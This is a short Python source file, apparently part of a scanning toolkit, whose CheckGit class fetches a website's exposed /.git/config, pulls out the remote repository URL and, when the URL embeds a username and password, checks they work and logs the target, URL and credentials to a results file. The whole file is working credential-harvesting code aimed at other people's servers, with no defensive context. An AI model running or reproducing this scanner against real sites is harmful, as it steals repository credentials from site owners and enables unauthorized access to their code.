import sys

import requests
import re


class CheckGit:
    def __init__(self):
        self.git_path = "/.git/config"

    def grab_config(self, star):
        try:
            zoeken = requests.get(star + self.git_path, allow_redirects=False, verify=False)
            if '[remote "origin"]' in zoeken.text:
                if "url =" in zoeken.text:
                    grab_url = re.findall('url = (.*?)\n', zoeken.text)[0]
                    check_grab = requests.get(grab_url, verify=False)
                    if check_grab.status_code == 200:
                        schrijven = open("Results/GitConfigVulns.txt", "a")
                        schrijven.write(f"URL: {star}\nGIT_URL: {grab_url}\n\n")
                        schrijven.close()
                    if str(grab_url).startswith("http://"):
                        pref = "http://"
                    else:
                        pref = "https://"
                    if "://" in grab_url and ":" in grab_url.split("://")[1] and "@" in grab_url:
                        username = str(grab_url).split("://")[1].split("@")[0].split(":")[0]
                        password = str(grab_url).split("://")[1].split("@")[0].split(":")[1]
                        config_url = pref + str(grab_url).split("://")[1].split("@")[1]
                        check_url = requests.get(grab_url, verify=True)
                        if check_url.status_code == 200:
                            schrijven = open("Results/GitConfigCedentials.txt", "a")
                            schrijven.write(f"URL: {star}\nGIT_URL: {grab_url}\nGIT_PATH: {config_url}\nUSERNAME: "
                                            f"{username}\nPASSWORD: {password}\n\n")
                            schrijven.close()
                            return True
        except Exception as e:
            return False

